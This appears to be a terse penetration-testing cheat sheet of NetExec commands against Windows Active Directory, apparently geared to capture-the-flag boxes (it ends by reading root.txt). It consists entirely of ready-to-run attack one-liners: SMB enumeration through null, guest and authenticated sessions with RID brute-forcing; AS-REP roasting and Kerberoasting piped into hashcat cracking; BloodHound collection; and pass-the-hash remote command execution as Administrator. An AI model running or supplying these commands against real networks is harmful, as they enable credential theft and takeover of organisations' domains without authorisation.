# nxc
#plateform/linux #target/remote #cat/ATTACK

## SMB all in one
```
nxc smb <ip> -u '<user>' -p '<passwd>' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt; cat users.txt
```

## SMB null all in one
```
nxc smb <ip> -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt; cat users.txt
```

## SMB guest all in one
```
nxc smb <ip> -u 'a' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt; cat users.txt
```

## LDAP anonymous all in one
```
nxc ldap <ip> -u '' -p ''
```

## LDAP all in one
```
nxc ldap <ip> -u '<user>' -p '<passwd>' --users --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## Execute bloodhound
```
nxc ldap <ip> -u '<user>' -p '<passwd>' --bloodhound --collection All --dns-server <ip>
```

## Execute bloodhound w/o ObjectProps
```
nxc ldap <ip> -u '<user>' -p '<passwd>' --bloodhound --collection Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn --dns-server <ip>
```

## Cat root.txt with administrator hash
```
nxc smb <ip> -u Administrator -H '<hash>' -x 'type C:\Users\Administrator\Desktop\root.txt'
```
